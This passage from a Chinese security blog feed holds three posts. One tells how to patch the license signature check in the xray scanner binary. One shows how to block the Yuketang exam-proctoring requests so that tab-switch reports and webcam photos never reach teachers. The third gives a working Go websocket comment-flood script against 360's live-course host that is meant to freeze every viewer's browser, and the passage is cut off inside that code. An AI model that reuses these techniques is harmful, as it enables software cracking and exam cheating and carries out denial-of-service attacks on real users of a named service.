<p>主要是无法确定应该修改哪一个地方，因为出现了不止一次，一个特征是调用 VerifyPSS 的那个 Call，可以尝试自己解析 pclntab 段，从中还原符号表找到这个验证函数的入口，然后找搜索关键 Call，再在这个 call 后面两三个汇编处找 setnz 或者 setz 进行修改</p>
</blockquote>
<h2 id="2020年10月4日-补充">2020年10月4日 补充</h2>
<p>感谢 @Lz1y 大佬在 PR#3 中提供的思路，现在已能够自动patch非arm版本的xray二进制了</p>
<h2 id="2020年10月5日-补充">2020年10月5日 补充</h2>
<p>上个版本直接全部进行替换，会导致xray有些功能出现错误，这里进行了修复</p>
<p>增加了 arm 版的自动patch，现在能够全版本破解了</p>
<h2 id="2020年11月6号晚-补充">2020年11月6号晚 补充</h2>
<p>刚刚发现又发新版了，发现已有的程序无法完成patch了，分析发现新的1.4虽然没有修改证书生成算法，但是针对我上面的patch进行了检查</p>
<p>我前面是对签名验证返回值进行修改，如果签名验证失败就改成验证成功。1.4增加了一次签名验证，验证的内容是错误的，必然会验证失败，如果patch还是修改为验证成功就落入了陷阱</p>
<p></p>
<p>思路是对的，但是问题不是在这里，我并没有对RSAVerify本身进行patch，而是patch函数返回后对结果的判断，并且只修改了一处判断，并没有对所有判断都进行修改，所以即使有检查也没有造成影响</p>
<p>新版本因为换用了Golang 1.14，是go的版本差异导致的patch问题（汇编不同了），目前完成了amd64平台的自动patch，其他的平台等大佬PR</p>
<p></p>
<h2 id="2020年11月11日-补充">2020年11月11日 补充</h2>
<p>感谢 <a href="https://github.com/nszy007" target="_blank" rel="noopener noreffer">@nszy007</a> 提供<a href="https://github.com/zu1k/comment/issues/4#issuecomment-725222928" target="_blank" rel="noopener noreffer">剩余平台的patch</a></p>
<h2 id="2020年11月11日-下午16点-补充">2020年11月11日 下午16点 补充</h2>
<p>收到 Chaitin 人员的要求，已删除相关源代码</p>
]]></description></item><item><title>屏蔽雨课堂在线考试异常上报</title><link>https://lgf.im/posts/security/web-security/yuketang-exam-block-report/</link><pubDate>Fri, 12 Jun 2020 20:23:46 +0000</pubDate><author>作者</author><guid>https://lgf.im/posts/security/web-security/yuketang-exam-block-report/</guid><description><![CDATA[<p>学校又开始推雨课堂的在线考试功能了，在老师的配合下稍微分析了一下</p>
<p>因为都是js代码，没有用wasm，分析还是比较简单的</p>
<h2 id="切屏检测">切屏检测</h2>
<p>考试过程中，如果切换浏览器标签，返回后会有一个切屏警告，并且老师那边也会有切屏记录</p>
<p>通过实验发现如果不切换浏览器标签，使用另一个浏览器窗口或者切换其他软件都不会触发这个记录</p>
<p>相关代码如下</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-javascript" data-lang="javascript"><span class="nx">onchange</span><span class="o">:</span> <span class="kd">function</span> <span class="p">(</span><span class="nx">t</span><span class="p">)</span> <span class="p">{</span>
    <span class="kd">var</span> <span class="nx">e</span> <span class="o">=</span> <span class="k">this</span><span class="p">;</span>
    <span class="k">if</span> <span class="p">(</span><span class="nb">document</span><span class="p">.</span><span class="nx">hidden</span> <span class="o">||</span> 
        <span class="mi">0</span> <span class="o">!=</span> <span class="nx">e</span><span class="p">.</span><span class="nx">onlineProctor</span> <span class="o">||</span> 
        <span class="nx">e</span><span class="p">.</span><span class="nx">getCacheResult</span><span class="p">(),</span> <span class="nx">e</span><span class="p">.</span><span class="nx">onlineProctor</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">if</span> <span class="p">(</span><span class="nb">document</span><span class="p">.</span><span class="nx">hidden</span><span class="p">)</span> <span class="p">{</span>
            <span class="nx">e</span><span class="p">.</span><span class="nx">time1</span> <span class="o">=</span> <span class="k">new</span> <span class="nb">Date</span><span class="p">,</span> <span class="nx">e</span><span class="p">.</span><span class="nx">uploadUnnormal</span><span class="p">(</span><span class="mi">12</span><span class="p">)</span>
        <span class="p">}</span> <span class="k">else</span> <span class="nx">x</span> <span class="o">&amp;&amp;</span> <span class="nx">clearTimeout</span><span class="p">(</span><span class="nx">x</span><span class="p">),</span> <span class="nx">x</span> <span class="o">=</span> <span class="nx">setTimeout</span><span class="p">(</span><span class="kd">function</span> <span class="p">()</span> <span class="p">{</span>
            <span class="nx">e</span><span class="p">.</span><span class="nx">$alert</span><span class="p">(</span><span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="p">{</span>
                <span class="nx">customClass</span><span class="o">:</span> <span class="s2">&#34;alertMsg&#34;</span><span class="p">,</span>
                <span class="nx">showClose</span><span class="o">:</span> <span class="o">!</span><span class="mi">1</span><span class="p">,</span>
                <span class="nx">message</span><span class="o">:</span> <span class="s2">&#34;系统监测到你切出了考试页面&lt;br/&gt;我们会将此行为报告你的老师&#34;</span><span class="p">,</span>
                <span class="nx">dangerouslyUseHTMLString</span><span class="o">:</span> <span class="o">!</span><span class="mi">0</span><span class="p">,</span>
                <span class="nx">confirmButtonText</span><span class="o">:</span> <span class="s2">&#34;继续考试&#34;</span><span class="p">,</span>
                <span class="nx">center</span><span class="o">:</span> <span class="o">!</span><span class="mi">0</span><span class="p">,</span>
                <span class="nx">callback</span><span class="o">:</span> <span class="kd">function</span> <span class="p">(</span><span class="nx">t</span><span class="p">)</span> <span class="p">{}</span>
            <span class="p">})</span>
        <span class="p">},</span> <span class="mi">1</span><span class="p">)</span>
    <span class="p">}</span> <span class="k">else</span><span class="p">;</span>
<span class="p">},</span>
</code></pre></td></tr></table>
</div>
</div><p>没有看代码之前我还猜想检查切屏可以通过focus来检查，看了代码后发现使用的是vue的 onchange 进行触发，然就在方法内检查document是否hidden</p>
<p>这样是无法检测到切换不同应用的，简直是自欺欺人啊</p>
<p>注意到检测到切标签后会触发 <code>e.uploadUnnormal(12)</code> 方法，进去看一下</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span><span class="lnt">9
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-javascript" data-lang="javascript"><span class="nx">uploadUnnormal</span><span class="o">:</span> <span class="kd">function</span> <span class="p">(</span><span class="nx">t</span><span class="p">)</span> <span class="p">{</span>
    <span class="kd">var</span> <span class="nx">e</span> <span class="o">=</span> <span class="k">this</span><span class="p">;</span>
    <span class="k">this</span><span class="p">.</span><span class="nx">$axios</span><span class="p">.</span><span class="nx">post</span><span class="p">(</span><span class="nx">API</span><span class="p">.</span><span class="nx">feed_add</span><span class="p">,</span> <span class="p">{</span>
        <span class="nx">exam_id</span><span class="o">:</span> <span class="k">this</span><span class="p">.</span><span class="nx">exam_id</span><span class="p">,</span>
        <span class="nx">action</span><span class="o">:</span> <span class="nx">t</span>
    <span class="p">}).</span><span class="nx">then</span><span class="p">(</span><span class="kd">function</span> <span class="p">(</span><span class="nx">t</span><span class="p">)</span> <span class="p">{}).</span><span class="k">catch</span><span class="p">(</span><span class="kd">function</span> <span class="p">(</span><span class="nx">t</span><span class="p">)</span> <span class="p">{</span>
        <span class="nx">e</span><span class="p">.</span><span class="nx">$message</span><span class="p">.</span><span class="nx">error</span><span class="p">(</span><span class="s2">&#34;发生错误&#34;</span><span class="p">)</span>
    <span class="p">})</span>
<span class="p">}</span>
</code></pre></td></tr></table>
</div>
</div><p>其中 <code>API.feed_add1</code> 是 <code>/online_proctor/stu/monitor/feed/add</code> 这个路径</p>
<p>也就是说切标签后会 POST 一个标号为12的action记录，抓包后也发现的确如此，也仅仅而已</p>
<h2 id="照片上传">照片上传</h2>
<p>查看请求发现图片是先上传到七牛云，然后将返回的连接发给服务器</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-javascript" data-lang="javascript"><span class="nx">handleCapture</span><span class="o">:</span> <span class="kd">function</span> <span class="p">()</span> <span class="p">{</span>
    <span class="kd">var</span> <span class="nx">t</span> <span class="o">=</span> <span class="k">this</span><span class="p">,</span>
        <span class="nx">e</span> <span class="o">=</span> <span class="k">this</span><span class="p">.</span><span class="nx">context</span><span class="p">,</span>
        <span class="nx">n</span> <span class="o">=</span> <span class="k">this</span><span class="p">.</span><span class="nx">$refs</span><span class="p">.</span><span class="nx">video</span><span class="p">;</span>
    <span class="k">if</span> <span class="p">(</span><span class="k">this</span><span class="p">.</span><span class="nx">isexam</span><span class="p">)</span> 
        <span class="nx">e</span><span class="p">.</span><span class="nx">drawImage</span><span class="p">(</span><span class="nx">n</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">160</span><span class="p">,</span> <span class="mi">120</span><span class="p">);</span>
    <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="nx">e</span><span class="p">.</span><span class="nx">drawImage</span><span class="p">(</span><span class="nx">n</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">240</span><span class="p">,</span> <span class="mi">180</span><span class="p">),</span> <span class="k">this</span><span class="p">.</span><span class="nx">reTake</span><span class="p">)</span> 
        <span class="k">return</span> <span class="k">void</span> <span class="k">this</span><span class="p">.</span><span class="nx">$emit</span><span class="p">(</span><span class="s2">&#34;changeReTake&#34;</span><span class="p">,</span> <span class="o">!</span><span class="mi">1</span><span class="p">);</span>
    <span class="nx">setTimeout</span><span class="p">(</span><span class="kd">function</span> <span class="p">()</span> <span class="p">{</span>
        <span class="kd">var</span> <span class="nx">e</span> <span class="o">=</span> <span class="nx">t</span><span class="p">.</span><span class="nx">$refs</span><span class="p">.</span><span class="nx">canvas</span><span class="p">.</span><span class="nx">toDataURL</span><span class="p">(</span><span class="s2">&#34;image/jpeg&#34;</span><span class="p">,</span> <span class="mi">1</span><span class="p">),</span>
            <span class="nx">n</span> <span class="o">=</span> <span class="nb">Object</span><span class="p">(</span><span class="nx">u</span><span class="p">.</span><span class="nx">b</span><span class="p">)(</span><span class="nx">e</span><span class="p">,</span> <span class="nb">Date</span><span class="p">.</span><span class="nx">now</span><span class="p">());</span>
        <span class="nx">t</span><span class="p">.</span><span class="nx">upload</span><span class="p">(</span><span class="nx">n</span><span class="p">).</span><span class="nx">then</span><span class="p">(</span><span class="kd">function</span> <span class="p">(</span><span class="nx">e</span><span class="p">)</span> <span class="p">{</span>
            <span class="kd">var</span> <span class="nx">n</span> <span class="o">=</span> <span class="nx">e</span> <span class="o">&amp;&amp;</span> <span class="nx">e</span><span class="p">.</span><span class="nx">url</span><span class="p">;</span>
            <span class="nx">t</span><span class="p">.</span><span class="nx">image_url</span> <span class="o">=</span> <span class="nx">n</span><span class="p">,</span> 
            <span class="nx">t</span><span class="p">.</span><span class="nx">$emit</span><span class="p">(</span><span class="s2">&#34;changeReTake&#34;</span><span class="p">,</span> <span class="o">!</span><span class="mi">0</span><span class="p">),</span> 
            <span class="nx">t</span><span class="p">.</span><span class="nx">$emit</span><span class="p">(</span><span class="s2">&#34;changeCanEnter&#34;</span><span class="p">,</span> <span class="o">!</span><span class="mi">0</span><span class="p">),</span> 
            <span class="nx">t</span><span class="p">.</span><span class="nx">isexam</span> <span class="o">&amp;&amp;</span> <span class="nx">t</span><span class="p">.</span><span class="nx">postRecord</span><span class="p">(</span><span class="nx">n</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span>
        <span class="p">})</span>
    <span class="p">},</span> <span class="mi">0</span><span class="p">)</span>
<span class="p">},</span>
</code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-javascript" data-lang="javascript"><span class="nx">upload</span><span class="o">:</span> <span class="kd">function</span> <span class="p">(</span><span class="nx">t</span><span class="p">)</span> <span class="p">{</span>
    <span class="kd">var</span> <span class="nx">e</span> <span class="o">=</span> <span class="nx">c</span><span class="p">.</span><span class="nx">a</span><span class="p">.</span><span class="nx">qiniuDomain</span><span class="p">;</span>
    <span class="k">return</span> <span class="k">new</span> <span class="nx">s</span><span class="p">.</span><span class="nx">a</span><span class="p">(</span><span class="kd">function</span> <span class="p">(</span><span class="nx">n</span><span class="p">,</span> <span class="nx">r</span><span class="p">)</span> <span class="p">{</span>
        <span class="kd">var</span> <span class="nx">i</span> <span class="o">=</span> <span class="p">{</span>
            <span class="nx">next</span><span class="o">:</span> <span class="kd">function</span> <span class="p">(</span><span class="nx">t</span><span class="p">)</span> <span class="p">{</span>
                <span class="nx">t</span><span class="p">.</span><span class="nx">total</span><span class="p">.</span><span class="nx">percent</span>
            <span class="p">},</span>
            <span class="nx">error</span><span class="o">:</span> <span class="kd">function</span> <span class="p">(</span><span class="nx">t</span><span class="p">)</span> <span class="p">{</span>
                <span class="nx">r</span><span class="p">({</span>
                    <span class="nx">url</span><span class="o">:</span> <span class="s2">&#34;&#34;</span>
                <span class="p">})</span>
            <span class="p">},</span>
            <span class="nx">complete</span><span class="o">:</span> <span class="kd">function</span> <span class="p">(</span><span class="nx">t</span><span class="p">)</span> <span class="p">{</span>
                <span class="kd">var</span> <span class="nx">r</span> <span class="o">=</span> <span class="nx">e</span> <span class="o">+</span> <span class="s2">&#34;/&#34;</span> <span class="o">+</span> <span class="nb">encodeURIComponent</span><span class="p">(</span><span class="nx">t</span><span class="p">.</span><span class="nx">key</span><span class="p">);</span>
                <span class="nx">n</span><span class="p">({</span>
                    <span class="nx">url</span><span class="o">:</span> <span class="nx">r</span>
                <span class="p">})</span>
            <span class="p">}</span>
        <span class="p">};</span>
        <span class="nx">c</span><span class="p">.</span><span class="nx">a</span> <span class="o">&amp;&amp;</span> <span class="nx">c</span><span class="p">.</span><span class="nx">a</span><span class="p">.</span><span class="nx">upload</span><span class="p">(</span><span class="nx">t</span><span class="p">,</span> <span class="nx">i</span><span class="p">,</span> <span class="s2">&#34;image&#34;</span><span class="p">,</span> <span class="o">!</span><span class="mi">1</span><span class="p">)</span>
    <span class="p">})</span>
<span class="p">},</span>
</code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-javascript" data-lang="javascript"><span class="nx">postRecord</span><span class="o">:</span> <span class="kd">function</span> <span class="p">(</span><span class="nx">t</span><span class="p">,</span> <span class="nx">e</span><span class="p">,</span> <span class="nx">n</span><span class="p">,</span> <span class="nx">r</span><span class="p">,</span> <span class="nx">i</span><span class="p">)</span> <span class="p">{</span>
    <span class="kd">var</span> <span class="nx">o</span> <span class="o">=</span> <span class="p">{</span>
        <span class="nx">exam_id</span><span class="o">:</span> <span class="k">this</span><span class="p">.</span><span class="nx">examid</span><span class="p">,</span>
        <span class="nx">image_url</span><span class="o">:</span> <span class="nx">t</span><span class="p">,</span>
        <span class="nx">label</span><span class="o">:</span> <span class="nx">e</span><span class="p">,</span>
        <span class="nx">event_group_id</span><span class="o">:</span> <span class="nx">n</span><span class="p">,</span>
        <span class="nx">operator_id</span><span class="o">:</span> <span class="nx">r</span><span class="p">,</span>
        <span class="nx">action</span><span class="o">:</span> <span class="nx">i</span>
    <span class="p">};</span>
    <span class="k">this</span><span class="p">.</span><span class="nx">$axios</span><span class="p">.</span><span class="nx">post</span><span class="p">(</span><span class="nx">API</span><span class="p">.</span><span class="nx">upload_photograph</span><span class="p">,</span> <span class="nx">o</span><span class="p">)</span>
                <span class="p">.</span><span class="nx">then</span><span class="p">(</span><span class="kd">function</span> <span class="p">(</span><span class="nx">t</span><span class="p">)</span> <span class="p">{})</span>
                <span class="p">.</span><span class="k">catch</span><span class="p">(</span><span class="kd">function</span> <span class="p">(</span><span class="nx">t</span><span class="p">)</span> <span class="p">{})</span>
<span class="p">}</span>
</code></pre></td></tr></table>
</div>
</div><h2 id="如何绕过">如何绕过</h2>
<p>那啥，就几个有用的url，反正都是后台请求，当做广告拦截了就行，这样老师那边就没有切屏警告和异常照片了</p>
<ul>
<li>changjiang-exam.yuketang.cn/online_proctor/stu/monitor/feed/add</li>
<li>changjiang-exam.yuketang.cn/online_proctor/stu/photograph/add</li>
<li>upload.qiniup.com</li>
<li>upload-z1.qiniup.com</li>
<li>upload-z2.qiniup.com</li>
<li>upload-na0.qiniup.com</li>
<li>upload-as0.qiniup.com</li>
</ul>
<p>插件我用的AdblockPLUS，手动添加几条规则就行，亲测好用</p>
]]></description></item><item><title>利用360直播课评论区对用户浏览器dos攻击</title><link>https://lgf.im/posts/security/web-security/dos-attack-on-360-university-user/</link><pubDate>Fri, 29 May 2020 14:01:45 +0000</pubDate><author>作者</author><guid>https://lgf.im/posts/security/web-security/dos-attack-on-360-university-user/</guid><description><![CDATA[<p>前段时间在360网络安全大学听免费的网络安全直播课，里面的老师有一些讲的不错</p>
<p>对评论区进行测试，发现对评论和送花速度没有进行限制，送花有总数50次限制，但是评论总数没有限制</p>
<p>并且，后端性能非常好，能够即时处理所有评论并通过websocket发送给所有直播课的听众</p>
<p>用户的浏览器效率比较低，无法及时处理后端返回的所有评论，从而导致浏览器卡死，如此只需要一个用户不断发送评论包，所有用户都会受到dos攻击</p>
<p>评论代码如下：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span><span class="lnt">53
</span><span class="lnt">54
</span><span class="lnt">55
</span><span class="lnt">56
</span><span class="lnt">57
</span><span class="lnt">58
</span><span class="lnt">59
</span><span class="lnt">60
</span><span class="lnt">61
</span><span class="lnt">62
</span><span class="lnt">63
</span><span class="lnt">64
</span><span class="lnt">65
</span><span class="lnt">66
</span><span class="lnt">67
</span><span class="lnt">68
</span><span class="lnt">69
</span><span class="lnt">70
</span><span class="lnt">71
</span><span class="lnt">72
</span><span class="lnt">73
</span><span class="lnt">74
</span><span class="lnt">75
</span><span class="lnt">76
</span><span class="lnt">77
</span><span class="lnt">78
</span><span class="lnt">79
</span><span class="lnt">80
</span><span class="lnt">81
</span><span class="lnt">82
</span><span class="lnt">83
</span><span class="lnt">84
</span><span class="lnt">85
</span><span class="lnt">86
</span><span class="lnt">87
</span><span class="lnt">88
</span><span class="lnt">89
</span><span class="lnt">90
</span><span class="lnt">91
</span><span class="lnt">92
</span><span class="lnt">93
</span><span class="lnt">94
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-golang" data-lang="golang"><span class="kn">package</span> <span class="nx">main</span>

<span class="kn">import</span> <span class="p">(</span>
	<span class="s">&#34;flag&#34;</span>
	<span class="s">&#34;log&#34;</span>
	<span class="s">&#34;net/http&#34;</span>
	<span class="s">&#34;net/url&#34;</span>
	<span class="s">&#34;os&#34;</span>
	<span class="s">&#34;os/signal&#34;</span>
	<span class="s">&#34;time&#34;</span>

	<span class="s">&#34;github.com/gorilla/websocket&#34;</span>
<span class="p">)</span>

<span class="kd">var</span> <span class="nx">addr</span> <span class="p">=</span> <span class="nx">flag</span><span class="p">.</span><span class="nf">String</span><span class="p">(</span><span class="s">&#34;addr&#34;</span><span class="p">,</span> <span class="s">&#34;trans.college.360.cn&#34;</span><span class="p">,</span> <span class="s">&#34;http service address&#34;</span><span class="p">)</span>

<span class="kd">func</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
	<span class="nx">flag</span><span class="p">.</span><span class="nf">Parse</span><span class="p">()</span>
	<span class="nx">log</span><span class="p">.</span><span class="nf">SetFlags</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>

	<span class="nx">interrupt</span> <span class="o">:=</span> <span class="nb">make</span><span class="p">(</span><span class="kd">chan</span> <span class="nx">os</span><span class="p">.</span><span class="nx">Signal</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span>
	<span class="nx">signal</span><span class="p">.</span><span class="nf">Notify</span><span class="p">(</span><span class="nx">interrupt</span><span class="p">,</span> <span class="nx">os</span><span class="p">.</span><span class="nx">Interrupt</span><span class="p">)</span>

	<span class="nx">u</span> <span class="o">:=</span> <span class="nx">url</span><span class="p">.</span><span class="nx">URL</span><span class="p">{</span>
		<span class="nx">Scheme</span><span class="p">:</span> <span class="s">&#34;wss&#34;</span><span class="p">,</span> 
		<span class="nx">Host</span><span class="p">:</span> <span class="o">*</span><span class="nx">addr</span><span class="p">,</span> 
		<span class="nx">Path</span><span class="p">:</span> <span class="s">&#34;/ws&#34;</span><span class="p">,</span> 
		<span class="nx">RawQuery</span><span class="p">:</span> <span class="s">&#34;live_course_id=10114&#34;</span>
	<span class="p">}</span>
	<span class="nx">log</span><span class="p">.</span><span class="nf">Printf</span><span class="p">(</span><span class="s">&#34;connecting to %s&#34;</span><span class="p">,</span> <span class="nx">u</span><span class="p">.</span><span class="nf">String</span><span class="p">())</span>


	<span class="nx">header</span> <span class="o">:=</span> <span class="nb">make</span><span class="p">(</span><span class="nx">http</span><span class="p">.</span><span class="nx">Header</span><span class="p">)</span>
	<span class="nx">header</span><span class="p">[</span><span class="s">&#34;Origin&#34;</span><span class="p">]</span> <span class="p">=</span> <span class="p">[]</span><span class="kt">string</span><span class="p">{</span><span class="s">&#34;https://admin.college.360.cn&#34;</span><span class="p">}</span>
	<span class="nx">header</span><span class="p">[</span><span class="s">&#34;User-Agent&#34;</span><span class="p">]</span> <span class="p">=</span> <span class="p">[]</span><span class="kt">string</span><span class="p">{</span><span class="s">&#34;Chrome/80.0.3987.122&#34;</span><span class="p">}</span>
	<span class="nx">header</span><span class="p">[</span><span class="s">&#34;Cookie&#34;</span><span class="p">]</span> <span class="p">=</span> <span class="p">[]</span><span class="kt">string</span><span class="p">{</span><span class="s">&#34;your cookie&#34;</span><span class="p">}</span>

	<span class="nx">dialer</span> <span class="o">:=</span> <span class="nx">websocket</span><span class="p">.</span><span class="nx">DefaultDialer</span>
	<span class="nx">dialer</span><span class="p">.</span><span class="nx">EnableCompression</span> <span class="p">=</span> <span class="kc">true</span>
	<span class="nx">c</span><span class="p">,</span> <span class="nx">_</span><span class="p">,</span> <span class="nx">err</span> <span class="o">:=</span> <span class="nx">dialer</span><span class="p">.</span><span class="nf">Dial</span><span class="p">(</span><span class="nx">u</span><span class="p">.</span><span class="nf">String</span><span class="p">(),</span> <span class="nx">header</span><span class="p">)</span>
	<span class="k">if</span> <span class="nx">err</span> <span class="o">!=</span> <span class="kc">nil</span> <span class="p">{</span>
		<span class="nx">log</span><span class="p">.</span><span class="nf">Fatal</span><span class="p">(</span><span class="s">&#34;dial:&#34;</span><span class="p">,</span> <span class="nx">err</span><span class="p">)</span>
	<span class="p">}</span>
	<span class="k">defer</span> <span class="nx">c</span><span class="p">.</span><span class="nf">Close</span><span class="p">()</span>

	<span class="nx">done</span> <span class="o">:=</span> <span class="nb">make</span><span class="p">(</span><span class="kd">chan</span> <span class="kd">struct</span><span class="p">{})</span>

	<span class="k">go</span> <span class="kd">func</span><span class="p">()</span> <span class="p">{</span>
		<span class="k">defer</span> <span class="nb">close</span><span class="p">(</span><span class="nx">done</span><span class="p">)</span>
		<span class="k">for</span> <span class="p">{</span>
			<span class="nx">_</span><span class="p">,</span> <span class="nx">message</span><span class="p">,</span> <span class="nx">err</span> <span class="o">:=</span> <span class="nx">c</span><span class="p">.</span><span class="nf">ReadMessage</span><span class="p">()</span>
			<span class="k">if</span> <span class="nx">err</span> <span class="o">!=</span> <span class="kc">nil</span> <span class="p">{</span>
				<span class="nx">log</span><span class="p">.</span><span class="nf">Println</span><span class="p">(</span><span class="s">&#34;read:&#34;</span><span class="p">,</span> <span class="nx">err</span><span class="p">)</span>
				<span class="k">return</span>
			<span class="p">}</span>
			<span class="nx">log</span><span class="p">.</span><span class="nf">Printf</span><span class="p">(</span><span class="s">&#34;recv: %s&#34;</span><span class="p">,</span> <span class="nx">message</span><span class="p">)</span>
		<span class="p">}</span>
	<span class="p">}()</span>

	<span class="nx">ticker</span> <span class="o">:=</span> <span class="nx">time</span><span class="p">.</span><span class="nf">NewTicker</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
	<span class="k">defer</span> <span class="nx">ticker</span><span class="p">.</span><span class="nf">Stop</span><span class="p">()</span>

	<span class="k">for</span> <span class="p">{</span>
		<span class="k">select</span> <span class="p">{</span>
		<span class="k">case</span> <span class="o">&lt;-</span><span class="nx">done</span><span class="p">:</span>
			<span class="k">return</span>
		<span class="k">case</span> <span class="o">&lt;-</span><span class="nx">ticker</span><span class="p">.</span><span class="nx">C</span><span class="p">:</span>
			<span class="nx">err</span> <span class="o">:=</span> <span class="nx">c</span><span class="p">.</span><span class="nf">WriteMessage</span><span class="p">(</span><span class="nx">websocket</span><span class="p">.</span><span class="nx">TextMessage</span><span class="p">,</span> <span class="p">[]</span><span class="nb">byte</span><span class="p">(</span>
					<span class="s">&#34;{\&#34;cmd\&#34;:\&#34;newMessage\&#34;,\&#34;message\&#34;:\&#34;感谢360\&#34;}&#34;</span>
				<span class="p">))</span>
			<span class="k">if</span> <span class="nx">err</span> <span class="o">!=</span> <span class="kc">nil</span> <span class="p">{</span>
				<span class="nx">log</span><span class="p">.</span><span class="nf">Println</span><span class="p">(</span><span class="s">&#34;write:&#34;</span><span class="p">,</span> <span class="nx">err</span><span class="p">)</span>
				<span class="k">return</span>
			<span class="p">}</span>
		<span class="k">case</span> <span class="o">&lt;-</span><span class="nx">interrupt</span><span class="p">:</span>
			<span class="nx">log</span><span class="p">.</span><span class="nf">Println</span><span class="p">(</span><span class="s">&#34;interrupt&#34;</span><span class="p">)</span>
			<span class="nx">err</span> <span class="o">:=</span> <span class="nx">c</span><span class="p">.</span><span class="nf">WriteMessage</span><span class="p">(</span>
				<span class="nx">websocket</span><span class="p">.</span><span class="nx">CloseMessage</span><span class="p">,</span> 
				<span class="nx">websocket</span><span class="p">.</span><span class="nf">FormatCloseMessage</span><span class="p">(</span>
					<span class="nx">websocket</span><span class="p">.</span><span class="nx">CloseNormalClosure</span><span class="p">,</span> <span class="s">&#34;&#34;</span>
				<span class="p">)</span>
			<span class="p">)</span>
			<span class="k">if</span> <span class="nx">err</span> <span class="o">!=</span> <span class="kc">nil</span> <span class="p">{</span>
